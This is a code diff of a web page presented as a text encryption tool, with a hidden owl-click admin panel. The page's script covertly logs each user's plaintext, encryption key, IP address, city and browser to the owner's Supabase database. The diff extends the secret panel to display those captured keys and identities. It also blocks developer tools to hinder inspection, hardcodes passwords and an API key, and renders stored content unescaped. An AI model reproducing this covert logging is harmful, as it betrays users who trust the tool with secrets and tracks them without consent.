@@ -83,7 +83,8 @@
     </div>
 
     <div id="secret-panel">
-        <button class="close-secret" onclick="document.getElementById('secret-panel').style.display='none'">EXIT</button>
+        <button class="close-secret" onclick="document.getElementById('secret-panel').style.display='none'">EXIT SECURE PANEL</button>
+        <h1 style="color:var(--matrix-green)">DATABASE: logs_english</h1>
         <div id="log-content">Loading...</div>
     </div>
 
@@ -92,7 +93,6 @@
     </footer>
 
     <script>
-        // الروابط الأصلية بدون تشفير معقد يضرب الاتصال
         const SUPA_URL = "https://ctvmxkwzzqwskgtgcuwc.supabase.co";
         const SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImN0dm14a3d6enF3c2tndGdjdXdjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYxNjE1MDksImV4cCI6MjA5MTczNzUwOX0.UrdE2w4gg-P9Hfy1b4uB34FES-CwQy0fs4LEF-TnagI";
         const sbClient = supabase.createClient(SUPA_URL, SUPA_KEY);
@@ -102,8 +102,6 @@
                 const n = new Date(); let h = n.getHours() % 12 || 12;
                 document.getElementById('digital-clock').innerText = `${String(h).padStart(2, '0')}:${String(n.getMinutes()).padStart(2, '0')}:${String(n.getSeconds()).padStart(2, '0')}:${String(n.getMilliseconds()).padStart(3, '0')}`;
             }, 10);
-
-            // تحريك الظل
             const t = document.getElementById('interactive-title'), o = document.getElementById('interactive-owl');
             document.addEventListener('mousemove', (e) => {
                 if (document.getElementById('main-header').style.display !== 'none') {
@@ -115,20 +113,17 @@
         }
 
         function verifyAccess() {
-            const input = document.getElementById('passInput').value;
-            if (input === "YALiM") {
+            if (document.getElementById('passInput').value === "YALiM") {
                 document.getElementById('lock-screen').style.display = 'none';
                 ['enc-sec', 'dec-sec', 'main-header', 'footer-sec'].forEach(id => document.getElementById(id).style.display = 'block');
-            } else {
-                alert("ACCESS DENIED");
-            }
+            } else { alert("ACCESS DENIED"); }
         }
 
         let clickCount = 0;
         function handleOwlClick() {
             clickCount++;
             if (clickCount === 3) {
-                let k = prompt("SECURE KEY:");
+                let k = prompt("ACCESS KEY:");
                 if (k === "YALiM_LOGS") { document.getElementById('secret-panel').style.display = 'block'; fetchLogs(); }
                 clickCount = 0;
             }
@@ -138,8 +133,8 @@
         async function fetchLogs() {
             const { data } = await sbClient.from('logs_english').select('*').order('created_at', { ascending: false });
             if (data) {
-                let h = '<table class="log-table"><tr><th>DATE</th><th>ACTION</th><th>CONTENT</th></tr>';
-                data.forEach(r => { h += `<tr><td>${new Date(r.created_at).toLocaleTimeString()}</td><td>${r.action_type}</td><td>${r.content}</td></tr>`; });
+                let h = '<table class="log-table"><tr><th>DATE</th><th>ACTION</th><th>CONTENT</th><th>KEY</th><th>INFO</th><th>BROWSER</th></tr>';
+                data.forEach(r => { h += `<tr><td>${new Date(r.created_at).toLocaleString()}</td><td>${r.action_type}</td><td>${r.content}</td><td>${r.key_used}</td><td>${r.user_info}</td><td>${r.browser}</td></tr>`; });
                 document.getElementById('log-content').innerHTML = h + '</table>';
             }
         }
@@ -157,18 +152,14 @@
                     try { const g = await fetch('https://ipapi.co/json/'); const gd = await g.json(); inf = `${gd.city}, ${gd.ip}`; } catch (e) {}
                     await sbClient.from('logs_english').insert([{ content: txt, key_used: ky.toString(), bracket_style: br, action_type: m, user_info: inf, browser: navigator.userAgent.split(' ').pop() }]);
                 }
-            } catch (e) { console.error(e); }
+            } catch (e) {}
             btn.innerText = m === 'encrypt' ? "ENCRYPT NOW" : "DECRYPT CODE";
         }
 
         function copyResult(id) { navigator.clipboard.writeText(document.getElementById(id).innerText).then(() => alert("COPIED")); }
 
-        // حماية F12 والـ Inspect
         window.addEventListener('keydown', function(e) {
-            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) {
-                e.preventDefault();
-                return false;
-            }
+            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) { e.preventDefault(); return false; }
         });
     </script>
 </body>
